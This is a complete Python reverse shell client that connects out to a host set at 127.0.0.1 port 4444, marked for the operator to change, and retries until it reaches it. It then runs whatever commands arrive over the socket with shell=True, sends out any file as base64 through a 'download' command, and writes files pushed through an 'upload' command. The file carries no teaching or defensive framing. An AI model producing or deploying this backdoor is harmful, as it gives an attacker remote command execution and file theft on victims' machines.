import socket
import json
import subprocess
import os
import base64
import time


# JSON send function
def send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


# JSON receive function
def recieve():
    data = ""
    while True:
        try:
            data += target.recv(1024).decode()
            return json.loads(data)
        except ValueError:
            continue


# Execute shell commands
def execute(command):
    try:
        result = subprocess.check_output(command, shell=True)
        return result.decode()
    except:
        return "Error executing command."


# Read file as base64
def read_file(path):
    with open(path, "rb") as f:
        return base64.b64encode(f.read()).decode()


# Write file from base64
def write_file(path, data):
    with open(path, "wb") as f:
        f.write(base64.b64decode(data))


# Main command loop
def run():
    while True:
        command = recieve()

        if command == "exit":
            break

        if command.startswith("cd "):
            path = command.split(" ", 1)[1]
            try:
                os.chdir(path)
                send("[+] Changed directory to " + path)
            except:
                send("[-] Failed to change directory")
            continue

        if command.startswith("download "):
            path = command.split(" ", 1)[1]
            try:
                file_data = read_file(path)
                send(file_data)
            except:
                send("[-] File not found")
            continue

        if command.startswith("upload "):
            filename = command.split(" ", 1)[1]
            file_data = recieve()
            try:
                write_file(filename, file_data)
                send("[+] Upload successful")
            except:
                send("[-] Upload failed")
            continue

        # Execute normal shell commands
        result = execute(command)
        send(result)


# Retry until connected
def connect():
    global target
    while True:
        try:
            target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target.connect(("127.0.0.1", 4444))  # CHANGE THIS
            run()
            break
        except:
            time.sleep(1)


connect()
